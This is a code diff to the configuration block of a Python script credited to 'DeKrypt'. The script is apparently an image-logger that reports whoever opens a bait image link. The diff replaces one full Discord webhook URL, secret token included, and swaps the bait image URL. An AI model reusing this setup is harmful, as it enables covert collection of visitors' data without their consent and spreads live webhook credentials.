@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1091220366984224788/Te54hSoJ1kqvAWLompNzA3aWux7gaiQ9IMgedx76z4grFYQd2dcefXbxnl5tbE4DOVbq",
-    "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1537614896995242016/s3Rq4APm0kBG86ztQK90gJUTz1VfxFnKnZG01BGe1vsCXvBbJoX9CYI5LI2LcciMROy5",
+    "image": "https://www.bing.com/images/search?view=detailV2&ccid=SnU3uWlt&id=6CEDAE03451EEEF3FAB5014BBBAD5230DE33A937&thid=OIP.SnU3uWlt-ypxcMSL06NPDwHaHa&mediaurl=https%3A%2F%2Fcdn.pfps.gg%2Fpfps%2F2658-aesthetic-meme.png&cdnurl=https%3A%2F%2Fth.bing.com%2Fth%2Fid%2FR.4a7537b9696dfb2a7170c48bd3a34f0f%3Frik%3DN6kz3jBSrbtLAQ%26pid%3DImgRaw%26r%3D0&exph=729&expw=729&q=meme+pfp&ck=BC4BED98DEE849B62B8CA96FE926AD39&selectedIndex=22&itb=0&cw=1532&ch=826&ajaxhist=0&ajaxserp=0&shtc=0&shth=OIP.SnU3uWlt-ypxcMSL06NPDwHaHa&shsc=idp&form=EX0050&shid=0ae61f55-1e76-4457-94af-63811918ac25&shtp=GetUrl&shtk=TWVtZXMgUGZw&shdk=Rm91bmQgb24gQmluZyBmcm9tIGNkbi5wZnBzLmdn&shhk=3PDJnqexH3w%2FjvKr9cGyZuwHyP2WJb1rxp9s%2FdmCF7g%3D", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
